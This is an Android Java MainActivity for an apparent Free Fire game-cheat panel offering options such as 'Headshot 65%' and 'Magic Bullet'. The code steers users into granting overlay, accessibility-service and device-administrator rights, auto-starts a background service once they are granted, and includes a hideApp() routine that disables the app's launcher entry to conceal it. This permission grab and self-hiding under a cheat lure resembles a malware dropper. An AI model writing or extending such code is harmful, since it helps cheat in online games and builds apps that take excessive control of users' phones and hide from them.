package com.voyre.app;

import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.provider.Settings;
import android.view.View;
import android.widget.Button;
import android.widget.LinearLayout;
import android.widget.TextView;
import android.widget.Toast;

import androidx.appcompat.app.AppCompatActivity;

public class MainActivity extends AppCompatActivity {
    
    private Button btnFF, btnFFMax, btnConfirm;
    private TextView tvWarning, tvSelected;
    private LinearLayout llCheats;
    private Button btnHS50, btnHS65, btnBadan80, btnBadanHS, btnMagicBullet;
    
    private String selectedGame = "";
    private String selectedCheat = "";
    private boolean isAdminActive = false;
    private boolean isOverlayGranted = false;
    private boolean isAccessibilityGranted = false;
    
    private DevicePolicyManager dpm;
    private ComponentName adminComponent;
    
    private SharedPreferences prefs;
    
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        
        prefs = getSharedPreferences("ff_panel", MODE_PRIVATE);
        
        // Init views
        btnFF = findViewById(R.id.btn_ff);
        btnFFMax = findViewById(R.id.btn_ffmax);
        btnConfirm = findViewById(R.id.btn_confirm);
        tvWarning = findViewById(R.id.tv_warning);
        tvSelected = findViewById(R.id.tv_selected);
        llCheats = findViewById(R.id.ll_cheats);
        
        btnHS50 = findViewById(R.id.btn_hs50);
        btnHS65 = findViewById(R.id.btn_hs65);
        btnBadan80 = findViewById(R.id.btn_badan80);
        btnBadanHS = findViewById(R.id.btn_badanhs);
        btnMagicBullet = findViewById(R.id.btn_magicbullet);
        
        // Init Device Admin
        dpm = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
        adminComponent = new ComponentName(this, AdminReceiver.class);
        
        // Check permissions
        checkPermissions();
        
        // ===== GAME SELECTION =====
        btnFF.setOnClickListener(v -> {
            selectedGame = "com.freefire.dts";
            btnFF.setBackgroundColor(getColor(android.R.color.holo_orange_dark));
            btnFFMax.setBackgroundColor(getColor(android.R.color.darker_gray));
            tvSelected.setText("✅ Selected: Free Fire");
            checkReady();
        });
        
        btnFFMax.setOnClickListener(v -> {
            selectedGame = "com.freefiremax.dts";
            btnFFMax.setBackgroundColor(getColor(android.R.color.holo_orange_dark));
            btnFF.setBackgroundColor(getColor(android.R.color.darker_gray));
            tvSelected.setText("✅ Selected: Free Fire MAX");
            checkReady();
        });
        
        // ===== CONFIRM BUTTON =====
        btnConfirm.setOnClickListener(v -> {
            if (selectedGame.isEmpty()) {
                Toast.makeText(this, "Please select a game first!", Toast.LENGTH_SHORT).show();
                return;
            }
            
            // Activate Device Admin
            activateDeviceAdmin();
        });
        
        // ===== CHEAT SELECTION =====
        btnHS50.setOnClickListener(v -> selectCheat("Headshot 50%", btnHS50));
        btnHS65.setOnClickListener(v -> selectCheat("Headshot 65%", btnHS65));
        btnBadan80.setOnClickListener(v -> selectCheat("Badan 80%", btnBadan80));
        btnBadanHS.setOnClickListener(v -> selectCheat("Badan + Headshot", btnBadanHS));
        btnMagicBullet.setOnClickListener(v -> selectCheat("Magic Bullet", btnMagicBullet));
        
        // Load saved state
        loadSavedState();
    }
    
    private void checkPermissions() {
        StringBuilder warning = new StringBuilder("⚠️ PERMISSION REQUIRED:\n");
        boolean allGranted = true;
        
        // Check Overlay
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (Settings.canDrawOverlays(this)) {
                isOverlayGranted = true;
            } else {
                warning.append("❌ Overlay Permission - Tap to grant\n");
                allGranted = false;
                // Request overlay
                Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                        Uri.parse("package:" + getPackageName()));
                startActivity(intent);
            }
        } else {
            isOverlayGranted = true;
        }
        
        // Check Accessibility
        String enabledServices = Settings.Secure.getString(getContentResolver(),
                Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES);
        if (enabledServices != null && enabledServices.contains(getPackageName() + "/" + ScreenControlService.class.getName())) {
            isAccessibilityGranted = true;
        } else {
            warning.append("❌ Accessibility Service - Tap to enable\n");
            allGranted = false;
        }
        
        // Check Device Admin
        if (dpm != null && dpm.isAdminActive(adminComponent)) {
            isAdminActive = true;
        } else {
            warning.append("❌ Device Admin - Will be activated on Confirm\n");
            allGranted = false;
        }
        
        if (allGranted) {
            tvWarning.setText("✅ All permissions granted! Ready to use.");
            tvWarning.setTextColor(getColor(android.R.color.holo_green_light));
        } else {
            tvWarning.setText(warning.toString());
            tvWarning.setTextColor(getColor(android.R.color.holo_red_light));
            
            // Make warning clickable to open settings
            tvWarning.setOnClickListener(v -> {
                Intent intent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
                startActivity(intent);
            });
        }
    }
    
    private void activateDeviceAdmin() {
        if (dpm != null && dpm.isAdminActive(adminComponent)) {
            isAdminActive = true;
            Toast.makeText(this, "Device Admin already active!", Toast.LENGTH_SHORT).show();
            checkReady();
            return;
        }
        
        Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
        intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComponent);
        startActivityForResult(intent, 1001);
    }
    
    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        if (requestCode == 1001) {
            checkPermissions();
            checkReady();
        }
    }
    
    private void selectCheat(String cheatName, Button btn) {
        selectedCheat = cheatName;
        
        // Reset all cheat buttons
        resetCheatButtons();
        
        // Highlight selected
        btn.setBackgroundColor(getColor(android.R.color.holo_orange_dark));
        btn.setTextColor(getColor(android.R.color.white));
        
        tvSelected.setText("🎯 Cheat: " + cheatName);
        checkReady();
    }
    
    private void resetCheatButtons() {
        Button[] buttons = {btnHS50, btnHS65, btnBadan80, btnBadanHS, btnMagicBullet};
        for (Button b : buttons) {
            b.setBackgroundColor(getColor(android.R.color.darker_gray));
            b.setTextColor(getColor(android.R.color.white));
        }
    }
    
    private void checkReady() {
        if (!selectedGame.isEmpty() && !selectedCheat.isEmpty() && isAdminActive) {
            btnConfirm.setText("✅ READY - START SERVICE");
            btnConfirm.setBackgroundColor(getColor(android.R.color.holo_green_dark));
            btnConfirm.setEnabled(true);
            
            // Auto start after 2 seconds
            new Handler().postDelayed(() -> {
                startServiceAndApplyCheat();
            }, 1500);
        } else if (!selectedGame.isEmpty() && !selectedCheat.isEmpty()) {
            btnConfirm.setText("⚠️ Activate Device Admin First");
            btnConfirm.setBackgroundColor(getColor(android.R.color.holo_orange_dark));
            btnConfirm.setEnabled(true);
        } else {
            btnConfirm.setText("🔒 Select Game & Cheat");
            btnConfirm.setBackgroundColor(getColor(android.R.color.darker_gray));
            btnConfirm.setEnabled(false);
        }
    }
    
    private void startServiceAndApplyCheat() {
        // Save selected game and cheat
        prefs.edit()
            .putString("selected_game", selectedGame)
            .putString("selected_cheat", selectedCheat)
            .apply();
        
        // Start background service
        Intent intent = new Intent(this, BackgroundService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(intent);
        } else {
            startService(intent);
        }
        
        Toast.makeText(this, "🚀 Service started with " + selectedCheat + " for " + selectedGame, Toast.LENGTH_LONG).show();
        
        // Optional: Hide app after a few seconds
        // new Handler().postDelayed(this::hideApp, 5000);
    }
    
    private void loadSavedState() {
        String savedGame = prefs.getString("selected_game", "");
        String savedCheat = prefs.getString("selected_cheat", "");
        
        if (!savedGame.isEmpty()) {
            if (savedGame.equals("com.freefire.dts")) {
                btnFF.performClick();
            } else if (savedGame.equals("com.freefiremax.dts")) {
                btnFFMax.performClick();
            }
        }
        
        if (!savedCheat.isEmpty()) {
            switch (savedCheat) {
                case "Headshot 50%": btnHS50.performClick(); break;
                case "Headshot 65%": btnHS65.performClick(); break;
                case "Badan 80%": btnBadan80.performClick(); break;
                case "Badan + Headshot": btnBadanHS.performClick(); break;
                case "Magic Bullet": btnMagicBullet.performClick(); break;
            }
        }
    }
    
    private void hideApp() {
        try {
            PackageManager pm = getPackageManager();
            ComponentName cn = new ComponentName(this, MainActivity.class);
            pm.setComponentEnabledSetting(cn, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, 0);
        } catch (Exception e) {}
    }
}